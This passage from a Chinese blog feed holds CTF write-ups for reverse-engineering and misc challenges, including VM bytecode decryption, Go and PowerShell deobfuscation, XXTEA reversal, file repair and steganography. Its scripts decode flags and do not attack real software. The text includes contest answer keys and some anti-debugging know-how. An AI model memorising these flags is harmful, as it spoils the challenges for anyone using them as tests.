[xsp+30h] [xbp-C0h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v8; <span class="comment">// [xsp+40h] [xbp-B0h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v9; <span class="comment">// [xsp+50h] [xbp-A0h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v10; <span class="comment">// [xsp+60h] [xbp-90h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v11; <span class="comment">// [xsp+70h] [xbp-80h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v12; <span class="comment">// [xsp+80h] [xbp-70h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v13; <span class="comment">// [xsp+90h] [xbp-60h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v14; <span class="comment">// [xsp+A0h] [xbp-50h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v15; <span class="comment">// [xsp+B0h] [xbp-40h]</span></span><br><span class="line"></span><br><span class="line"> __int128 v16; <span class="comment">// [xsp+C0h] [xbp-30h]</span></span><br><span class="line"></span><br><span class="line"> __int64 v17; <span class="comment">// [xsp+D0h] [xbp-20h]</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">caddr_t</span>)<span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">goto</span> LABEL_8;</span><br><span class="line"></span><br><span class="line"> v17 = <span class="number">0LL</span>;</span><br><span class="line"></span><br><span class="line"> v15 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v16 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v13 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v14 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v11 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v12 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v9 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v10 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v7 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v8 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> *(_OWORD *)__s = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> v6 = <span class="number">0u</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"please input your flag:"</span>);</span><br><span class="line"></span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%s"</span>, __s);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ( <span class="built_in">strlen</span>(__s) != <span class="number">29</span> )</span><br><span class="line"></span><br><span class="line">LABEL_8:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"> myoperate(__s, <span class="number">29</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">29</span>; ++i )</span><br><span class="line"></span><br><span class="line"> {</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( __s[i] != byte_100003F47[i] )</span><br><span class="line"></span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"error!"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">goto</span> LABEL_8;</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"> }</span><br><span class="line"></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"ok you get the flag"</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/wps9.jpg" alt="img"> </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encData= [0xDF, 0xD5, 0xF1, 0xD1, 0xFF, 0xDB, 0xA1, 0xA5, 0x89, 0xBD, 0xE9, 0x95, 0xB3, 0x9D, 0xE9, 0xB3, 0x85, 0x99, 0x87, 0xBF, 0xE9, 0xB1, 0x89, 0xE9, 0x91, 0x89, 0x89, 0x8F, 0xAD]</span><br></pre></td></tr></tbody></table></figure><p>主要的指令</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">myoperate</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span><br><span class="line"></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line"> __int64 v2; <span class="comment">// x20</span></span><br><span class="line"></span><br><span class="line"> _QWORD v5[<span class="number">2</span>]; <span class="comment">// [xsp+8h] [xbp-98h] BYREF</span></span><br><span class="line"></span><br><span class="line"> _QWORD v6[<span class="number">2</span>]; <span class="comment">// [xsp+18h] [xbp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line"> _QWORD v7[<span class="number">2</span>]; <span class="comment">// [xsp+28h] [xbp-78h] BYREF</span></span><br><span class="line"></span><br><span class="line"> _QWORD v8[<span class="number">2</span>]; <span class="comment">// [xsp+38h] [xbp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> LODWORD(v2) = a2;</span><br><span class="line"></span><br><span class="line"> dword_100008003 = <span class="number">-1091715345</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">caddr_t</span>)<span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ( (<span class="type">int</span>)v2 &gt;= <span class="number">1</span> )</span><br><span class="line"></span><br><span class="line"> {</span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">unsigned</span> <span class="type">int</span>)v2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">   v8[<span class="number">0</span>] = <span class="number">0x20D01011903001A</span>LL;</span><br><span class="line"></span><br><span class="line">   *(_QWORD *)((<span class="type">char</span> *)v8 + <span class="number">7</span>) = <span class="number">0x300010201180702</span>LL;</span><br><span class="line"></span><br><span class="line">   BYTE2(v8[<span class="number">0</span>]) = *a1;</span><br><span class="line"></span><br><span class="line">   interpretBytecode((<span class="type">char</span> *)v8, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">   v7[<span class="number">0</span>] = <span class="number">0x20D02011903001A</span>LL;</span><br><span class="line"></span><br><span class="line">   *(_QWORD *)((<span class="type">char</span> *)v7 + <span class="number">7</span>) = <span class="number">0x400010201180602</span>LL;</span><br><span class="line"></span><br><span class="line">   BYTE2(v7[<span class="number">0</span>]) = vm_body;</span><br><span class="line"></span><br><span class="line">   interpretBytecode((<span class="type">char</span> *)v7, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">   v6[<span class="number">0</span>] = <span class="number">0x20D03011903001A</span>LL;</span><br><span class="line"></span><br><span class="line">   *(_QWORD *)((<span class="type">char</span> *)v6 + <span class="number">7</span>) = <span class="number">0x500010201180502</span>LL;</span><br><span class="line"></span><br><span class="line">   BYTE2(v6[<span class="number">0</span>]) = vm_body;</span><br><span class="line"></span><br><span class="line">   interpretBytecode((<span class="type">char</span> *)v6, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">   v5[<span class="number">0</span>] = <span class="number">0x20D04011903001A</span>LL;</span><br><span class="line"></span><br><span class="line">   *(_QWORD *)((<span class="type">char</span> *)v5 + <span class="number">7</span>) = <span class="number">0x600010201180402</span>LL;</span><br><span class="line"></span><br><span class="line">   BYTE2(v5[<span class="number">0</span>]) = vm_body;</span><br><span class="line"></span><br><span class="line">   interpretBytecode((<span class="type">char</span> *)v5, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">   *a1++ = ((<span class="type">unsigned</span> __int8)vm_body &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * vm_body);</span><br><span class="line"></span><br><span class="line">   --v2;</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( v2 );</span><br><span class="line"></span><br><span class="line"> }</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现指令是写死的，解密即可</p><p>exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    encData = [<span class="number">0xDF</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0xA1</span>, <span class="number">0xA5</span>, <span class="number">0x89</span>, <span class="number">0xBD</span>, <span class="number">0xE9</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x9D</span>, <span class="number">0xE9</span>, <span class="number">0xB3</span>, <span class="number">0x85</span>,</span><br><span class="line">               <span class="number">0x99</span>,</span><br><span class="line">               <span class="number">0x87</span>, <span class="number">0xBF</span>, <span class="number">0xE9</span>, <span class="number">0xB1</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, <span class="number">0x91</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8F</span>, <span class="number">0xAD</span>, <span class="number">0x57</span>]</span><br><span class="line">    length = <span class="built_in">len</span>(encData)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        temp = encData[i]</span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">3</span>) | (temp &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        temp ^= <span class="number">0xBE</span></span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">4</span>) | (temp &lt;&lt; <span class="number">4</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        temp ^= <span class="number">0xED</span></span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">5</span>) | (temp &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        temp ^= <span class="number">0xBE</span></span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">6</span>) | (temp &lt;&lt; <span class="number">2</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        temp ^= <span class="number">0xEF</span></span><br><span class="line">        temp = ((temp &gt;&gt; <span class="number">7</span>) | (temp &lt;&lt; <span class="number">1</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(temp), end=<span class="string">''</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>DASCTF{you_are_right_so_cool} </p><h1 id="ez-misc-Acropalypse-Multi-Tool"><a href="#ez-misc-Acropalypse-Multi-Tool" class="headerlink" title="ez_misc - Acropalypse-Multi-Tool"></a>ez_misc - Acropalypse-Multi-Tool</h1><p>拿到附件看到有一部分裸漏的，直接crc爆破修复</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/wps1.jpg" alt="img"> </p><p>得到了这个。。</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/wps2.jpg" alt="img"> </p><p>010发现了fivenumber 字样</p><p>并且pk 03 04修复一下</p><p>解压得到vzbtrvplnnvphsqkxsiqibroou</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/wps3.jpg" alt="img"> </p><p>根据fivenumber暴破</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/wps4.jpg" alt="img"> </p><p>得到try to think the s nipping tools</p><p>联想到前段时间*CTF的snipping tools</p><p>使用同款工具  得解</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/wps5.jpg" alt="img"> </p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/wps6.jpg" alt="img"> </p><p>CvE_1s_V3Ry_intEr3sting!!</p><h1 id="Matryoshka-veracrypt-x2F-零宽隐写"><a href="#Matryoshka-veracrypt-x2F-零宽隐写" class="headerlink" title="Matryoshka - veracrypt/零宽隐写"></a>Matryoshka - veracrypt/零宽隐写</h1><p>winhex打开挂载，找到了encrypt</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903110504706.png" alt="image-20230903110504706"></p><p>3个flag分区</p><p>得到这几个附件</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903110552239.png" alt="image-20230903110552239"></p><p>提示盲水印</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903110633006.png" alt="image-20230903110633006"></p><p>解出encrypt密码：watermark_is_fun</p><p>将encrypt使用veracrypt挂载,得到flag.txt<br>明显看见了零宽隐写</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903110725225.png" alt="image-20230903110725225"></p><p>零宽隐写得到一个key：Matryoshka</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903110754097.png" alt="image-20230903110754097"></p><p>将flag(密文)</p><p>base32解码得到PALTRT{uvxgdamljolp0x_yau_y1eb_hz3_m14q!!!}</p><p>猜测维吉尼亚解码，使用上面key解码得解</p><p><img src="/2023/09/03/2023%E7%BE%8A%E5%9F%8E%E6%9D%AFWriteUp/image-20230903110858325.png" alt="image-20230903110858325"></p><p>DASCTF{congratulati0n_you_f1nd_th3_f14g!!!}</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023通配符CTF-*CTF-WriteUp</title>
      <link href="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/"/>
      <url>/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="goGpt"><a href="#goGpt" class="headerlink" title="goGpt"></a>goGpt</h1><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>使用 <code>go_parser</code>恢复go符号表</p><p>使用方法：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在ida64中按下按键 `alt + P` 选择`go_parser.py`</span><br><span class="line">运行等待即可</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730113337387.png" alt="image-20230730113337387"></p><p>插件项目地址：<a href="https://github.com/0xjiayu/go_parser">GitHub - 0xjiayu/go_parser：IDAPro 的又一个 Golang 二进制解析器</a></p><p>恢复后<img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730113448364.png" alt="image-20230730113448364"></p><p>mian函数</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730114134706.png" alt="image-20230730114134706"></p><p>往下</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730114357447.png" alt="image-20230730114357447"></p><h2 id="解密："><a href="#解密：" class="headerlink" title="解密："></a>解密：</h2><p>接着呢</p><p>动调找到key</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730113836579.png" alt="image-20230730113836579"></p><p>然后编写脚本解密即可</p><p>exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">"fiAGBkgXN3McFy9hAHRfCwYaIjQCRDFsXC8ZYBFmEDU="</span></span><br><span class="line">key=<span class="string">"TcR@3t_3hp_5_G1H"</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">y=<span class="built_in">list</span>(base64.b64decode(x))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(y[i]^<span class="built_in">ord</span>(key[i%<span class="number">16</span>])),end=<span class="string">""</span>)</span><br></pre></td></tr></tbody></table></figure><h1 id="ez-code"><a href="#ez-code" class="headerlink" title="ez_code"></a>ez_code</h1><h2 id="法一：终端运行"><a href="#法一：终端运行" class="headerlink" title="法一：终端运行"></a>法一：终端运行</h2><p>题目描述 –&gt;powershell脚本语言</p><p>将整个powershell代码在powershell中运行，得到</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/-16906360419744.png" alt="img"></p><p>将  最后面的<code>|  .${-``} 去掉</code>，得到这一段</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/-16906360419731.png" alt="img"></p><p>这一段(上图)是假的</p><p>程序的结构大概是这样 <code>xxx1 = "xxx2"; "xxx3" | xxx</code>4</p><p>然后再跑这一段,这一段是 <code>"xxx2"</code></p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/-16906360419742.png" alt="img"></p><p>得到真的代码</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/-16906360419743.png" alt="img"></p><p>将此代码cv跑一遍得到python代码</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">chiper</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.d = <span class="number">0x87654321</span></span><br><span class="line">        k0 = <span class="number">0x67452301</span></span><br><span class="line">        k1 = <span class="number">0xefcdab89</span></span><br><span class="line">        k2 = <span class="number">0x98badcfe</span></span><br><span class="line">        k3 = <span class="number">0x10325476</span></span><br><span class="line">        self.k = [k0, k1, k2, k3]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">e</span>(<span class="params">self, n, v</span>):</span><br><span class="line">        <span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">MX</span>(<span class="params">z, y, total, key, p, e</span>):</span><br><span class="line">            temp1 = (z.value &gt;&gt; <span class="number">6</span> ^ y.value &lt;&lt; <span class="number">4</span>) + \</span><br><span class="line">                (y.value &gt;&gt; <span class="number">2</span> ^ z.value &lt;&lt; <span class="number">5</span>)</span><br><span class="line">            temp2 = (total.value ^ y.value) + \</span><br><span class="line">                (key[(p &amp; <span class="number">3</span>) ^ e.value] ^ z.value)</span><br><span class="line">            <span class="keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line">        key = self.k</span><br><span class="line">        delta = self.d</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>//n</span><br><span class="line">        total = c_uint32(<span class="number">0</span>)</span><br><span class="line">        z = c_uint32(v[n-<span class="number">1</span>])</span><br><span class="line">        e = c_uint32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">            total.value += delta</span><br><span class="line">            e.value = (total.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">                y = c_uint32(v[p+<span class="number">1</span>])</span><br><span class="line">                v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value</span><br><span class="line">                z.value = v[p]</span><br><span class="line">            y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">            v[n-<span class="number">1</span>] = c_uint32(v[n-<span class="number">1</span>] + MX(z, y, total,</span><br><span class="line">                              key, n-<span class="number">1</span>, e).value).value</span><br><span class="line">            z.value = v[n-<span class="number">1</span>]</span><br><span class="line">            rounds -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bytes2ints</span>(<span class="params">self,cs:<span class="built_in">bytes</span></span>)-&gt;<span class="built_in">list</span>:</span><br><span class="line">        new_length=<span class="built_in">len</span>(cs)+(<span class="number">8</span>-<span class="built_in">len</span>(cs)%<span class="number">8</span>)%<span class="number">8</span></span><br><span class="line">        barray=cs.ljust(new_length,<span class="string">b'\x00'</span>)</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        v=[]</span><br><span class="line">        <span class="keyword">while</span> i &lt; new_length:</span><br><span class="line">            v0 = <span class="built_in">int</span>.from_bytes(barray[i:i+<span class="number">4</span>], <span class="string">'little'</span>)</span><br><span class="line">            v1 = <span class="built_in">int</span>.from_bytes(barray[i+<span class="number">4</span>:i+<span class="number">8</span>], <span class="string">'little'</span>)</span><br><span class="line">            v.append(v0)</span><br><span class="line">            v.append(v1)</span><br><span class="line">            i += <span class="number">8</span></span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">instr:<span class="built_in">str</span>,checklist:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    length=<span class="built_in">len</span>(instr)</span><br><span class="line">    <span class="keyword">if</span> length%<span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Incorrect format."</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    c=chiper()</span><br><span class="line">    v = c.bytes2ints(instr.encode())</span><br><span class="line">    output=<span class="built_in">list</span>(c.e(<span class="built_in">len</span>(v),v))</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;<span class="built_in">len</span>(checklist)):</span><br><span class="line">        <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(output) <span class="keyword">and</span> output[i]==checklist[i]:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="built_in">len</span>(checklist):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    ans=[<span class="number">1374278842</span>, <span class="number">2136006540</span>, <span class="number">4191056815</span>, <span class="number">3248881376</span>]</span><br><span class="line">    <span class="comment"># generateRes()</span></span><br><span class="line">    flag=<span class="built_in">input</span>(<span class="string">'Please input flag:'</span>)</span><br><span class="line">    res=check(flag,ans)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Congratulations, you've got the flag!"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Flag is *ctf{your_input}!"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Nope,try again!'</span>)</span><br></pre></td></tr></tbody></table></figure><h2 id="法二：vscode动调"><a href="#法二：vscode动调" class="headerlink" title="法二：vscode动调"></a>法二：vscode动调</h2><p>打开vscode，创建文件<code>1.PS1</code></p><p>复制完就一行，很长</p><p>打个断点</p><p>运行，在local板块找到变量<code>${@*}</code></p><p>因为，变量有两段，两段中间有个<code>;</code>, 第一段是真的，第二段是假的</p><p>所以下断运行，得到的是第一段的结果（真的）</p><p>然后cv结果，即可得到python源代码</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730112904408.png" alt="image-20230730112904408"></p><h2 id="解密：-1"><a href="#解密：-1" class="headerlink" title="解密："></a>解密：</h2><p>魔改xxtea</p><p>写脚本解密</p><p>Exp</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 